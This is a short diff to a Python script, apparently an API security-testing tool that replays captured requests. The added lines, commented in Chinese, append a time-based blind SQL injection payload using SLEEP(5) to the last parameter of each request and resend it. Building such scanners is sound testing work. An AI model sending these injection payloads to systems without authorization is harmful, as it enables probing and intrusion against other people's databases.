@@ -52,6 +52,15 @@ def extract_request_details_and_send(file_path):
                 headers_copy['token'] = ''
             send_request(request_method, url, original_params, headers_copy)
 
+        # 测试时间盲注的场景
+        params = original_params.copy()
+        last_key = list(original_params.keys())[-1]  # 获取最后一个参数的键
+        if isinstance(params[last_key], int):
+            params[last_key] = f"{original_params[last_key]} OR IF(1=1, SLEEP(5), 0)"  # 修改最后一个参数的值
+        else:
+            params[last_key] = original_params[last_key] + " OR IF(1=1, SLEEP(5), 0)"
+        send_request(request_method, url, params, headers)
+
 
 def send_request(request_method, url, params, headers):
     # print(f"请求方法: {request_method}")
